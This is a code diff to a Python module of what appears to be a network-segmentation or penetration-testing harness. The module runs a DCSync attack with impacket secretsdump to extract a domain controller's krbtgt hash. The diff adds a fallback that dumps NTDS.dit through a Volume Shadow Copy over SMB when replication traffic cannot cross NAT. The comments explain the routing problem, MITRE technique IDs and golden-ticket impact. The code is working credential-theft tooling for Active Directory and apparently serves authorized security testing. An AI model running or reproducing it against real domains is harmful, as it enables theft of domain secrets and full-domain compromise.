@@ -10,20 +10,23 @@ For every other target, behaviour is byte-for-byte the same
 ctx.run_cmd(...) call as before — this only changes anything for a
 registered NAT'd target.
 
-The in-process path uses the DRSUAPI (remote replication) method first —
-that IS DCSync (T1003.006), impacket-secretsdump's default. But a cloud /
-NAT'd target (159/167) often forwards only SMB(445)/RPC-EPM(135): the EPM
-hands back the DRSUAPI endpoint on the DC's INTERNAL IP + a DYNAMIC high
-port that the NAT doesn't forward, so DRSGetNCChanges can't connect and
-times out (RPC-over-NAT). For THOSE targets only, when DRSUAPI is
-unreachable, this falls back to the VSS method (Volume Shadow Copy of
-NTDS.dit over SMB/445, which DOES traverse the 445 forward) and labels the
-result `[VSS-FALLBACK]`. VSS is a DIFFERENT technique (T1003.003, NTDS.dit
-theft — not RPC replication), so the fallback is always tagged and never
-silently reported as DRSUAPI/DCSync: the row still proves the DC's secrets
-are extractable through the boundary, while making clear replication itself
-did not traverse. (Set HARNESS_DCSYNC_NO_VSS=1 to disable the fallback and
-keep DRSUAPI-only, e.g. to assert RPC-replication segmentation.)
+BOTH paths try the DRSUAPI (remote replication) method FIRST — that IS DCSync
+(T1003.006), impacket-secretsdump's default. But a NAT'd / segmented DC often
+forwards only SMB(445)/RPC-EPM(135): the EPM hands back the DRSUAPI endpoint on
+the DC's INTERNAL IP + a DYNAMIC high port that the boundary doesn't forward, so
+DRSGetNCChanges can't connect and times out (RPC-over-NAT). This happens both for
+the in-process cloud targets (159/167, 445→4445/135→1135 NAT) AND for an ordinary
+public-IP DC behind an SD-WAN reached over the CLI (e.g. 110.x, direct 445/135 but
+the replication endpoint still unroutable). In EITHER path, when DRSUAPI is
+unreachable, this falls back to the VSS method (Volume Shadow Copy of NTDS.dit over
+SMB/445, which DOES traverse) and labels the result `[VSS-FALLBACK]`. VSS is a
+DIFFERENT technique (T1003.003, NTDS.dit theft — not RPC replication), so the
+fallback is always tagged and never silently reported as DRSUAPI/DCSync: the row
+still proves the DC's secrets are extractable through the boundary, while making
+clear replication itself did not traverse. The CLI fallback is gated to the
+connect/RPC-failure signature (a clean AUTH error or flat no-service is left as-is,
+not masked by VSS). Set HARNESS_DCSYNC_NO_VSS=1 to disable the fallback in both
+paths and keep DRSUAPI-only, e.g. to assert RPC-replication segmentation.
 """
 import io
 import os
@@ -157,12 +160,40 @@ def run(target, ctx):
     if not tool:
         return ("# dcsync vs %s\n\n[SKIP] impacket not installed — secretsdump "
                 "unavailable (pip install impacket / apt python3-impacket)." % target)
-    return ctx.run_cmd(
-        # DCSync of JUST krbtgt — CONSISTENT with the in-process path above (which
-        # uses justUser="krbtgt"). krbtgt is the DCSync crown jewel (its key forges
-        # golden tickets = full-domain compromise), so pulling only it proves the
-        # attack while avoiding dumping every account's hash into evidence. You do
-        # NOT need -just-dc-user to "do DCSync" — a bare secretsdump dumps the whole
-        # domain via the same DRSUAPI replication; this is just the scoped, cleaner
-        # PoC. Drop the flag here (and set justUser=None above) for a full dump.
+    # DCSync of JUST krbtgt — CONSISTENT with the in-process path above (which uses
+    # justUser="krbtgt"). krbtgt is the DCSync crown jewel (its key forges golden
+    # tickets = full-domain compromise), so pulling only it proves the attack while
+    # avoiding dumping every account's hash into evidence. You do NOT need
+    # -just-dc-user to "do DCSync" — a bare secretsdump dumps the whole domain via
+    # the same DRSUAPI replication; this is just the scoped, cleaner PoC.
+    drs = ctx.run_cmd(
         tool + " {domain}/{dc_user}:{dc_pass}@{target} -just-dc-user krbtgt", target)
+    if re.search(META["success_regex"], drs):
+        return drs                                   # real DCSync via DRSUAPI replication
+    # VSS fallback — SAME rationale as the in-process (cloud) path, now for any
+    # NAT'd/segmented target reached over the CLI (e.g. a public-IP DC behind an
+    # SD-WAN like 110.x): when DRSUAPI can't traverse (RPC-over-NAT — the Endpoint
+    # Mapper hands the replication endpoint back on the DC's INTERNAL IP + a dynamic
+    # high port the boundary doesn't forward) but SMB/445 IS reachable, pull NTDS via
+    # a Volume Shadow Copy over 445. Gated to the connect/RPC-failure signature so a
+    # clean AUTH error or a flat "no service" is left as-is (not masked by VSS), and
+    # disabled by HARNESS_DCSYNC_NO_VSS=1. ALWAYS labelled: VSS is T1003.003 (NTDS.dit
+    # theft), a DIFFERENT technique than RPC-replication DCSync — never silently
+    # relabelled, so the row stays honest about what actually traversed.
+    no_vss = os.environ.get("HARNESS_DCSYNC_NO_VSS", "").strip().lower() in ("1", "true", "yes")
+    rpc_unreachable = re.search(r"timed out|could not connect|unreachable|rpc_s_|DCERPC|"
+                                r"Errno|connection refused", drs, re.I)
+    if no_vss or not rpc_unreachable:
+        return drs                                   # auth/other failure, or fallback off — as reported
+    vss = ctx.run_cmd(
+        tool + " {domain}/{dc_user}:{dc_pass}@{target} -use-vss", target)
+    krb = [l for l in vss.splitlines() if "krbtgt:" in l.lower()]
+    n = sum(1 for l in vss.splitlines() if re.search(r":\d+:aad3b435", l))
+    note = ("[VSS-FALLBACK] DRSUAPI/DCSync replication was UNREACHABLE (RPC-over-NAT: the "
+            "dynamic replication endpoint isn't reachable through the boundary). Fell back "
+            "to a Volume Shadow Copy of NTDS.dit over SMB/445 (T1003.003 — a DIFFERENT "
+            "technique than RPC-replication DCSync). The DC's secrets ARE extractable "
+            "through the boundary; replication itself did not traverse.\n")
+    body = ("\n".join(krb) + "\n[VSS dumped %d account(s); showing krbtgt]\n" % n) if krb else vss
+    return (drs + "\n\n--- DRSUAPI unreachable — VSS fallback (secretsdump -use-vss) ---\n"
+            + note + body)
